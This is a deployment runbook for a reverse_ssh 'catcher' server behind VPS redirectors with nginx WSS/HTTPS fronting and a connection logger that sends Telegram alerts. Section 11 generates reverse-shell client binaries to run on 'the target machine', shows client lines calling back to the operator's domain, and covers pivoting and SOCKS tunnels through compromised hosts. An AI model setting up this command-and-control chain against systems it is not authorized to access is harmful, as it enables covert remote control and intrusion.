# Manual Deployment from a Clean Ubuntu Image

This runbook assumes fresh Ubuntu 22.04 LTS or 24.04 LTS servers.

Repository references:

- `reverse_logger`: <https://github.com/durck/reverse_logger>
- `reverse_ssh`: <https://github.com/durck/reverse_ssh>

Topology:

```text
external client -> VPS public IP:443 -> VPS SoftEther interface -> main internal IP:3232 -> reverse_ssh
```

For WSS/HTTPS public transports, nginx terminates public TLS on the VPS and
proxies only the configured transport paths to the same internal
`reverse_ssh` target. Raw DNAT remains a fallback for raw TCP-style exposure.

The main server does not need a SoftEther interface. It only needs a
private/internal address reachable from the VPS through the existing SoftEther
network path. SoftEther installation and account provisioning are intentionally
out of scope because they are handled by deployment automation. The Ansible
playbook in `deploy/ansible/` automates the nginx edge host after DNS,
SoftEther reachability, open `80/tcp` and `443/tcp`, and central logger values
are known.

Replace all example addresses, tokens, image names, and interface names before
applying commands.

## 1. Main Server Base Bootstrap

Run as a sudo-capable user on a clean main Ubuntu server:

```sh
sudo apt-get update
sudo apt-get upgrade -y
sudo apt-get install -y ca-certificates curl git gnupg openssh-client openssl sqlite3
```

Install Docker Engine and the Compose plugin from Docker's official apt
repository:

```sh
sudo install -m 0755 -d /etc/apt/keyrings
sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc
sudo chmod a+r /etc/apt/keyrings/docker.asc

sudo tee /etc/apt/sources.list.d/docker.sources >/dev/null <<EOF
Types: deb
URIs: https://download.docker.com/linux/ubuntu
Suites: $(. /etc/os-release && echo "${UBUNTU_CODENAME:-$VERSION_CODENAME}")
Components: stable
Architectures: $(dpkg --print-architecture)
Signed-By: /etc/apt/keyrings/docker.asc
EOF

sudo apt-get update
sudo apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
sudo systemctl enable --now docker
sudo docker run --rm hello-world
```

Allow the deploy user to run Docker. The rest of this runbook uses `docker`
and `docker compose` without `sudo`.

```sh
sudo usermod -aG docker "$USER"
newgrp docker
docker info >/dev/null
docker compose version
```

If `docker info` still fails with a permission error, log out and back in, then
rerun the check.

## 2. Clone the Repository

```sh
sudo mkdir -p /opt/reverse-logger
sudo chown "$USER:$USER" /opt/reverse-logger
git clone https://github.com/durck/reverse_logger.git /opt/reverse-logger
```

For SSH-based deployment, use:

```sh
git clone git@github.com:durck/reverse_logger.git /opt/reverse-logger
```

## 3. Prepare Main Server Data and Env

```sh
sudo mkdir -p /opt/reverse-logger/data/reverse_ssh
sudo mkdir -p /opt/reverse-logger/data/logger
sudo chown -R "$USER:$USER" /opt/reverse-logger/data/reverse_ssh

cd /opt/reverse-logger
cp .env.example .env
chmod 600 .env
```

Generate deployment tokens:

```sh
openssl rand -hex 32
openssl rand -hex 32
```

Generate the operator SSH key that will be seeded into `reverse_ssh`
`authorized_keys`. This is the key you will use when connecting through
`reverse_ssh`; it is not the SSH key used by Ansible to manage the VPS:

```sh
ssh-keygen -t ed25519 -a 100 -f ~/.ssh/reverse_ssh_operator -C "reverse_ssh_operator"
cat ~/.ssh/reverse_ssh_operator.pub
```

Keep the private key in your local `~/.ssh/` or a vault. Put only the single
public key line into `SEED_AUTHORIZED_KEYS`.

Edit `.env`:

```sh
nano .env
```

Set at minimum:

- `REVERSE_SSH_BIND_IP`: private/internal main-server address reachable from
  the VPS.
- `REVERSE_SSH_BIND_PORT`: internal target port, normally `3232`.
- `REVERSE_SSH_EXTERNAL_ADDRESS`: public VPS entrypoint, for example
  `vps-entrypoint.example.com:443`.
- `REVERSE_SSH_PUBLIC_PORT`: public VPS entrypoint port; keep it aligned with
  the VPS DNAT `PUBLIC_PORT`.
- `REVERSE_SSH_WS_PATH` / `REVERSE_SSH_PUSH_PATH`: listener web transport
  paths. Keep them aligned with nginx, `nginx-edge-forwarder`, central
  `INGRESS_WS_PATH` / `INGRESS_PUSH_PATH`, and generated clients.
- `REVERSE_SSH_TRUSTED_PROXY_CIDR`: set this to the trusted nginx/VPN source
  CIDR, for example `<vps_internal_ip>/32`, when nginx terminates TLS and
  forwards real-IP headers.
- `REVERSE_SSH_IMAGE`: local Docker image tag for your custom `reverse_ssh`
  build, normally `reverse-ssh:local`.
- `REVERSE_SSH_REPO_URL`: optional repository URL to clone automatically.
- `REVERSE_SSH_SOURCE_DIR`: local path for a manually cloned or
  automatically cloned `reverse_ssh` repository.
- `SEED_AUTHORIZED_KEYS`: `reverse_ssh` operator public key contents, not a
  file path and not the private key.
- `WEBHOOK_TOKEN`: first generated token.
- `EDGE_FORWARD_TOKEN`: second generated token if optional edge forwarding is
  used.
- `INGRESS_WS_PATH` / `INGRESS_PUSH_PATH`: central validation paths for nginx
  ingress events. Keep them aligned with VPS nginx and `nginx-edge-forwarder`
  `RSSH_WS_PATH` / `RSSH_PUSH_PATH`; defaults are `/ws` and `/push`.
- `TELEGRAM_*` settings and `TELEGRAM_PROXY_URL` if alerts are enabled.

## 4. Build the reverse_ssh Image Locally

If you want the helper to clone the repository, set `REVERSE_SSH_REPO_URL` in
`.env` first:

```text
REVERSE_SSH_REPO_URL=https://github.com/durck/reverse_ssh.git
REVERSE_SSH_REPO_REF=main
REVERSE_SSH_SOURCE_DIR=/opt/reverse-logger/src/reverse_ssh
REVERSE_SSH_IMAGE=reverse-ssh:local
```

If you prefer to clone manually, leave `REVERSE_SSH_REPO_URL` empty and clone
the repository to `REVERSE_SSH_SOURCE_DIR`:

```sh
mkdir -p /opt/reverse-logger/src
git clone https://github.com/durck/reverse_ssh.git /opt/reverse-logger/src/reverse_ssh
```

Build the local image:

```sh
cd /opt/reverse-logger
set -a
. ./.env
set +a
sh deploy/docker/build-reverse-ssh-image.sh
docker image inspect "$REVERSE_SSH_IMAGE" >/dev/null
```

The build helper expects the `reverse_ssh` repository to contain a Dockerfile.
If the Dockerfile is in a custom location, set `REVERSE_SSH_DOCKERFILE` and
`REVERSE_SSH_BUILD_CONTEXT` in `.env`.

## 5. Start the Main Stack

```sh
cd /opt/reverse-logger
docker compose build rssh-logger
```

`rssh-logger` runs as the unprivileged `app` user inside its container. The
host bind mount for `LOGGER_DATA_DIR` must be writable by that container user;
otherwise SQLite may fail at startup with `unable to open database file: out of
memory (14)`.

Set the logger data directory owner to the UID/GID from the built image:

```sh
set -a
. ./.env
set +a

LOGGER_DIR="${LOGGER_DATA_DIR:-/opt/reverse-logger/data/logger}"
APP_UID="$(docker compose run --rm --no-deps --entrypoint sh rssh-logger -c 'id -u' | tr -d '\r')"
APP_GID="$(docker compose run --rm --no-deps --entrypoint sh rssh-logger -c 'id -g' | tr -d '\r')"

sudo mkdir -p "$LOGGER_DIR"
sudo chown -R "$APP_UID:$APP_GID" "$LOGGER_DIR"
sudo chmod 750 "$LOGGER_DIR"
```

Start the stack:

```sh
docker compose up -d
docker compose ps
```

The Docker entrypoint starts the `reverse_ssh` listener from `.env`. With the
default paths, it is equivalent to:

```sh
./server \
  --datadir /data \
  --enable-client-downloads \
  --tls \
  --external_address "$REVERSE_SSH_EXTERNAL_ADDRESS" \
  --ws-path "$REVERSE_SSH_WS_PATH" \
  --push-path "$REVERSE_SSH_PUSH_PATH" \
  :2222
```

When `REVERSE_SSH_TRUSTED_PROXY_CIDR` is set, the entrypoint also adds:

```sh
--trusted-proxy-cidr "$REVERSE_SSH_TRUSTED_PROXY_CIDR"
```

The `reverse_ssh` listener must be bound only to the internal address, for
example:

```text
192.0.2.10:3232 -> reverse_ssh:2222
```

Do not bind it to `0.0.0.0` unless you explicitly want direct public exposure
from the main server.

## 6. Connect to reverse_ssh and Register Webhook

Follow this sequence after the Compose stack is running. This prepares the
catcher console and webhook registration only. Generate public WSS/HTTPS
clients after the VPS entrypoint is configured in later steps.

### 6.1 Load the deployment environment

Run on the main server:

```sh
cd /opt/reverse-logger
set -a
. ./.env
set +a
```

### 6.2 Connect to the catcher console

The `SEED_AUTHORIZED_KEYS` value from `.env` authorizes the operator SSH key
for the `reverse_ssh` server console. From the main server, or from any
workstation that can route to `REVERSE_SSH_BIND_IP:REVERSE_SSH_BIND_PORT`,
connect to the catcher console:

```sh
ssh -i ~/.ssh/reverse_ssh_operator \
  -p "${REVERSE_SSH_BIND_PORT:-3232}" \
  "$REVERSE_SSH_BIND_IP"
```

If your workstation cannot reach the internal bind address directly, connect
from the main server shell or create a normal SSH tunnel to the main server
first:

```sh
ssh -L 3232:<REVERSE_SSH_BIND_IP>:<REVERSE_SSH_BIND_PORT> <admin>@<main-server>
ssh -i ~/.ssh/reverse_ssh_operator -p 3232 127.0.0.1
```

Do not use plain OpenSSH against the public `wss://` or `https://` nginx
entrypoint. That public endpoint is for generated `reverse_ssh` clients; the
operator console is the SSH service exposed by the `reverse_ssh` server on its
internal bind address.

### 6.3 Register the logger webhook

Run inside the catcher console:

```text
webhook --on http://rssh-logger:8080/hooks/<WEBHOOK_TOKEN>
webhook -l
```

Use the exact token from `.env`.

## 7. VPS Base Bootstrap

Run on each clean Ubuntu VPS that will accept public `80/tcp` and `443/tcp`:

```sh
sudo apt-get update
sudo apt-get upgrade -y
sudo DEBIAN_FRONTEND=noninteractive apt-get install -y \
  ca-certificates curl git iproute2 iptables iptables-persistent \
  netcat-openbsd netfilter-persistent tcpdump
```

Enable IPv4 forwarding:

```sh
sudo tee /etc/sysctl.d/99-reverse-logger-forwarding.conf >/dev/null <<EOF
net.ipv4.ip_forward=1
EOF
sudo sysctl --system
```

SoftEther provisioning is handled outside this runbook. After the existing
automation has prepared the VPS, verify the VPN interface, routes, and target
reachability:

```sh
ip -br addr
ip route
nc -vz 192.0.2.10 3232
```

In the examples below, `vpn_softether` is the VPS SoftEther interface and
`192.0.2.10:3232` is the main `reverse_ssh` target.

## 8. Apply VPS DNAT

Clone the repository on the VPS or copy only `deploy/iptables/vps-forward.sh`
from the main server:

```sh
sudo mkdir -p /opt/reverse-logger
sudo chown "$USER:$USER" /opt/reverse-logger
git clone https://github.com/durck/reverse_logger.git /opt/reverse-logger
```

Apply DNAT:

```sh
sudo env \
  PUBLIC_IFACE=eth0 \
  VPN_IFACE=vpn_softether \
  PUBLIC_PORT=443 \
  RSSH_TARGET_IP=192.0.2.10 \
  RSSH_TARGET_PORT=3232 \
  sh /opt/reverse-logger/deploy/iptables/vps-forward.sh
```

Leave `SNAT_SOURCE_IP` unset by default. If replies cannot route back through
the VPS, rerun with `SNAT_SOURCE_IP=<VPS_SOFTETHER_IP>` and accept that webhook
`ip_raw` will show the VPS/VPN source address.

If you changed `REVERSE_SSH_PUBLIC_PORT` in the main `.env`, pass the same
value as `PUBLIC_PORT` here. The script also accepts exported
`REVERSE_SSH_PUBLIC_PORT` as a fallback when `PUBLIC_PORT` is unset.

Persist the applied iptables rules after validation:

```sh
sudo netfilter-persistent save
sudo systemctl enable netfilter-persistent
```

Open only `80/tcp` and `443/tcp` on the public VPS firewall or cloud firewall.
Port `80/tcp` is required for Let's Encrypt HTTP-01 validation and may redirect
all non-ACME traffic. Restrict SSH and management access separately.

See [softether-entrypoint.md](softether-entrypoint.md) for additional DNAT and
SNAT notes.

## 9. Optional Main Ingress Guard

Apply a default-deny policy on the main server's internal ingress interface if
that network also carries traffic from untrusted sources. This is not a
SoftEther interface on the main server; it is the normal interface where the
VPS-routed traffic arrives.

In the default DNAT-only path, do not set a source allowlist here: the main
server sees the real internet client IP, not the VPS VPN IP.

```sh
sudo env \
  INGRESS_IFACE=eth0 \
  REVERSE_SSH_BIND_IP=192.0.2.10 \
  REVERSE_SSH_PORT=3232 \
  sh /opt/reverse-logger/deploy/iptables/main-firewall.sh
```

If centralized edge-event forwarding is enabled, add
`LOGGER_BIND_PORT=8080` so the same path may also reach the central logger. If
VPS forwarding uses `SNAT_SOURCE_IP`, you may additionally set
`ALLOWED_SOURCE_IPS` to those SNAT source addresses.

Verify after applying:

```sh
sudo iptables -S RSSH_INGRESS_GUARD
sudo iptables -S INPUT | grep RSSH_INGRESS_GUARD
sudo iptables -S DOCKER-USER | grep RSSH_INGRESS_GUARD
```

Persist only after verifying access:

```sh
sudo netfilter-persistent save
```

## 10. Optional edge-logger

`edge-logger` is not the default forwarding path in the SoftEther model. Use
it only if you explicitly need VPS-side connection events and accept a
user-space TCP proxy in the data path.

If enabled, point it at the same internal target:

```text
EDGE_LISTEN_ADDR=:443
EDGE_TARGET_ADDR=192.0.2.10:3232
VPS_NAME=vps-1
VPS_PUBLIC_IP=198.51.100.10
VPS_PUBLIC_PORT=443
EDGE_FORWARD_ENABLED=false
```

The systemd unit runs with a dynamic unprivileged user and grants only
`CAP_NET_BIND_SERVICE`, so it can bind `443/tcp` without broader root
privileges.

By default, edge events stay in `/var/lib/reverse-logger/edge_events.jsonl` on
the VPS. To forward them centrally, expose the logger only on the main
internal bind IP with `docker-compose.edge-forward.yml` and set:

```text
EDGE_FORWARD_ENABLED=true
EDGE_FORWARD_URL=http://192.0.2.10:8080/edge-events
EDGE_FORWARD_TOKEN=<EDGE_FORWARD_TOKEN_FROM_MAIN_ENV>
```

## 10a. Optional Nginx WSS/HTTPS Entrypoint

If clients use `wss://` or `https://` transports and the VPS should present a
normal HTTPS surface, use [nginx-wss-https-entrypoint.md](nginx-wss-https-entrypoint.md)
instead of raw DNAT or `edge-logger`.

This path logs only WSS handshakes and HTTPS polling init requests on the VPS,
forwards them to `/ingress-events/<EDGE_FORWARD_TOKEN>`, and keeps the
`reverse_ssh` webhook as the canonical connected/disconnected source.

Keep these values identical across the stack:

- nginx public `rssh_ws_path` / `rssh_push_path`;
- VPS forwarder `RSSH_WS_PATH` / `RSSH_PUSH_PATH`;
- central logger `INGRESS_WS_PATH` / `INGRESS_PUSH_PATH`;
- main `reverse_ssh` listener `REVERSE_SSH_WS_PATH` /
  `REVERSE_SSH_PUSH_PATH`;
- generated clients from `link --ws-path` / `link --push-path`.

Use absolute base paths without a trailing slash, for example `/ws`,
`/rssh-ws`, `/push`, or `/rssh-push`.

When nginx is in front of `reverse_ssh`, set
`REVERSE_SSH_TRUSTED_PROXY_CIDR=<vps_internal_ip>/32` or a narrower CIDR that
contains only trusted VPS nginx sources, then recreate the `reverse_ssh`
container. The nginx route overwrites `X-Real-IP` and `X-Forwarded-For` with
`$remote_addr`; do not accept those headers from untrusted sources.

## 10b. Automated Nginx WSS/HTTPS VPS Entrypoint

For a clean VPS edge rollout, use the Ansible playbook:

```sh
cp deploy/ansible/inventory.example.ini deploy/ansible/inventory.ini
cp deploy/ansible/group_vars/vps_edge.example.yml deploy/ansible/group_vars/vps_edge.yml
nano deploy/ansible/inventory.ini
nano deploy/ansible/group_vars/vps_edge.yml
ansible-playbook -i deploy/ansible/inventory.ini deploy/ansible/vps-edge.yml
```

The playbook installs nginx, Snap Certbot, builds `nginx-edge-forwarder`,
issues a free Let's Encrypt certificate with HTTP-01 webroot validation,
renders systemd and nginx config, and enables both services. It still requires
an existing A record pointing `rssh_domain` at the VPS, open `80/tcp` and
`443/tcp`, SoftEther/internal reachability to `backend_reverse_ssh_url`, and
`nginx_edge_acme_email`. PTR is useful for operations hygiene but is not used
for ACME validation. Wildcard certificates are not supported by this HTTP-01
flow; use DNS-01 if wildcard certificates are required. Do not run
`certbot --nginx` against this entrypoint because Ansible owns the nginx
configuration.
See [../deploy/ansible/README.md](../deploy/ansible/README.md) for all
variables and rollback commands.

## 11. Generate Client and Connect Through reverse_ssh

Run this step only after one of the public VPS entrypoint paths is working:

- raw DNAT from steps 7-8; or
- nginx WSS/HTTPS edge from steps 10a-10b.

For WSS/HTTPS, the public DNS record, TLS certificate, nginx route, SoftEther
path, and backend reachability must already be valid. Otherwise the generated
client will have a correct callback value but no reachable public endpoint.

### 11.1 Connect to the catcher console

From the main server, load `.env` and connect:

```sh
cd /opt/reverse-logger
set -a
. ./.env
set +a

ssh -i ~/.ssh/reverse_ssh_operator \
  -p "${REVERSE_SSH_BIND_PORT:-3232}" \
  "$REVERSE_SSH_BIND_IP"
```

### 11.2 Generate the reverse_ssh client

Run inside the catcher console. The `--wss` and `--https` flags bake the
public transport scheme into the client. `REVERSE_SSH_EXTERNAL_ADDRESS` from
`.env` supplies the host and port unless `-s` is provided explicitly.

The listener paths are already applied to the Dockerized `reverse_ssh` server
through `REVERSE_SSH_WS_PATH` and `REVERSE_SSH_PUSH_PATH`. Use matching values
when generating clients.

Default WSS entrypoint:

```text
link --wss --ws-path /ws --push-path /push --name linux-wss
```

Default HTTPS polling entrypoint:

```text
link --https --ws-path /ws --push-path /push --name linux-https
```

For custom public paths, first set matching values in `.env` before starting
or recreating `reverse_ssh`:

```text
REVERSE_SSH_WS_PATH=/rssh-ws
REVERSE_SSH_PUSH_PATH=/rssh-push
INGRESS_WS_PATH=/rssh-ws
INGRESS_PUSH_PATH=/rssh-push
```

Then recreate the listener:

```sh
docker compose up -d --force-recreate reverse_ssh rssh-logger
```

Use the same values in `link`:

```text
link --wss --ws-path /rssh-ws --push-path /rssh-push --name linux-wss
link --https --ws-path /rssh-ws --push-path /rssh-push --name linux-https
```

The command prints a download URL. Copy that URL to the target machine,
download the generated client, and run it there. In `link -l`, the `Url`
column is the binary download URL, while `Client Callback` is the callback
transport baked into the binary. With the TLS listener used by this stack, the
download URL should be `https://...`; WSS clients still show `wss://...` in
`Client Callback`.

If you run a standalone client manually instead of using `link`, use the same
public transport URL and paths:

```sh
./client -d wss://<rssh-domain>:443 --ws-path /ws
./client -d https://<rssh-domain>:443 --push-path /push
```

### 11.3 Confirm the client is connected

Run inside the catcher console:

```text
ls
```

Use the client id shown by `ls` in the next step.

### 11.4 Connect to the target through reverse_ssh

Interactive connection from the catcher console:

```text
connect <client-id>
```

OpenSSH jump mode from a host that can reach
`REVERSE_SSH_BIND_IP:REVERSE_SSH_BIND_PORT`:

```sh
ssh -i ~/.ssh/reverse_ssh_operator \
  -J "${REVERSE_SSH_BIND_IP}:${REVERSE_SSH_BIND_PORT:-3232}" \
  <client-id>
```

For a SOCKS tunnel through the connected client:

```sh
ssh -i ~/.ssh/reverse_ssh_operator \
  -D 9050 \
  -J "${REVERSE_SSH_BIND_IP}:${REVERSE_SSH_BIND_PORT:-3232}" \
  <client-id>
```

## 12. Configure Telegram Proxy

If the main server cannot reach Telegram directly, configure the proxy on a
VPS using [telegram-proxy.md](telegram-proxy.md). Then smoke-test from the main
server:

```sh
curl -x "$TELEGRAM_PROXY_URL" "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getMe"
```

## 13. Smoke Test

Send a sample webhook inside the Compose network:

```sh
docker compose exec rssh-logger wget -qO- \
  --post-data='{"Status":"connected","ID":"sample","IP":"203.0.113.10:50000","HostName":"user.host","Version":"test","Timestamp":"2026-06-09T12:00:00Z"}' \
  --header='Content-Type: application/json' \
  "http://127.0.0.1:8080/hooks/${WEBHOOK_TOKEN}"
```

Check durable logs:

```sh
tail -n 5 /opt/reverse-logger/data/logger/events.jsonl
sqlite3 /opt/reverse-logger/data/logger/events.db 'select status, host_name, ip_raw, received_at from events order by id desc limit 5;'
```

Then test the real path:

1. Connect from outside to `VPS_PUBLIC_IP:443`.
2. Confirm the reverse_ssh webhook event arrives.
3. Check `ip_raw` in JSONL or SQLite.
4. If `ip_raw` is the real client IP, keep plain DNAT.
5. If `ip_raw` is a VPS/VPN IP, either accept that limitation or enable
   optional VPS-side connection logging.

## 14. Optional systemd Installation

After manual validation:

```sh
sudo cp deploy/systemd/rssh-monitor.service /etc/systemd/system/rssh-monitor.service
sudo systemctl daemon-reload
sudo systemctl enable rssh-monitor
sudo systemctl start rssh-monitor
```

Check:

```sh
systemctl status rssh-monitor
journalctl -u rssh-monitor -n 100 --no-pager
```

## Rollback

Main server:

```sh
cd /opt/reverse-logger
docker compose down
sudo systemctl disable --now rssh-monitor || true
```

VPS:

```sh
sudo iptables -t nat -F RSSH_VPS_PREROUTING || true
sudo iptables -t nat -F RSSH_VPS_POSTROUTING || true
sudo iptables -F RSSH_VPS_FORWARD || true
sudo netfilter-persistent save
```

Then remove or disable:

- VPS DNAT/firewall rules;
- SoftEther account/session for affected VPS nodes;
- Telegram proxy credentials;
- any manually installed `edge-logger` systemd units.
